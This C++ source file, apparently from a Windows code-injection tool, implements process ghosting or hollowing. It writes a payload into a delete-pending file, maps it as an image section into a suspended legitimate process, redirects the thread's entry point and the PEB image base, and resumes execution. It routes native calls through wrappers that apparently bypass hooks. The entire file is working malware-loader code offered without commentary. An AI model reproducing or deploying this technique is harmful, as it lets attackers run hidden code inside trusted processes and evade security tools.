#include "inject.h"

#include "ntddk.h"
#include "common.h"

BYTE* get_nt_hrds(const BYTE* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    LONG pe_offset = idh->e_lfanew;

    if (pe_offset > 1024) return NULL;

    IMAGE_NT_HEADERS32 *inh = (IMAGE_NT_HEADERS32 *)(pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    return (BYTE*)inh;
}

DWORD get_entry_point_rva(const BYTE *pe_buffer)
{
    BYTE* payload_nt_hdr = get_nt_hrds(pe_buffer);
    if (payload_nt_hdr == NULL) {
        return 0;
    }

    IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
    DWORD ep_addr = payload_nt_hdr64->OptionalHeader.AddressOfEntryPoint;
    return ep_addr;
}

BOOL update_remote_entry_point(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va)
{
    CONTEXT context = { 0 };
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!NT_SUCCESS(UtGetContextThread(pi.hThread, &context))) {
        return FALSE;
    }
    context.Rcx = entry_point_va;
    return NT_SUCCESS(UtSetContextThread(pi.hThread, &context));
}

ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &pi)
{
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!NT_SUCCESS(UtGetContextThread(pi.hThread, &context))) {
        return 0;
    }
    ULONGLONG PEB_addr = context.Rdx;
    return PEB_addr;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi)
{
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    if (update_remote_entry_point(pi, ep_va) == FALSE) {
        return false;
    }
    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi);
    if (!remote_peb_addr) {
        return false;
    }
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + (ULONGLONG)(sizeof(ULONGLONG) * 2));
    const size_t img_base_size = sizeof(ULONGLONG);

    SIZE_T written = 0;
    if (!NT_SUCCESS(UtWriteVirtualMemory(pi.hProcess, remote_img_base,
        &load_base, img_base_size,
        &written)))
    {
        return false;
    }
    return true;
}


PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = UtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status != STATUS_IMAGE_NOT_AT_BASE) {
            return NULL;
        }
    }
    return sectionBaseAddress;
}

HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize) {
    HANDLE hDelFile = create_file(filePath);
    if (hDelFile == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    IO_STATUS_BLOCK status_block = { 0 };

    FILE_DISPOSITION_INFORMATION info = { 0 };
    info.DeleteFile = TRUE;

    NTSTATUS status = UtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        return INVALID_HANDLE_VALUE;
    }

    status = UtWriteFile(
        hDelFile,
        NULL,
        NULL,
        NULL,
        &status_block,
        payladBuf,
        payloadSize,
        NULL,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    status = UtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hDelFile
    );
    if (status != STATUS_SUCCESS) {
        return INVALID_HANDLE_VALUE;
    }
    UtClose(hDelFile);
    hDelFile = nullptr;

    return hSection;
}

HANDLE transacted_hollowing(wchar_t* tmpFile, wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payladBuf, DWORD payloadSize, wchar_t* startDir)
{
    HANDLE hSection = make_section_from_delete_pending_file(tmpFile, payladBuf, payloadSize);

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }

    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, runtimeData, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED);
    if (pi.hProcess == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    
    PVOID remote_base = map_buffer_into_process(pi.hProcess, hSection);
    if (!remote_base) {
        return INVALID_HANDLE_VALUE;
    }

    if (!redirect_to_payload(payladBuf, remote_base, pi)) {
        return INVALID_HANDLE_VALUE;
    }

    UtResumeThread(pi.hThread, NULL);
    return pi.hProcess;
}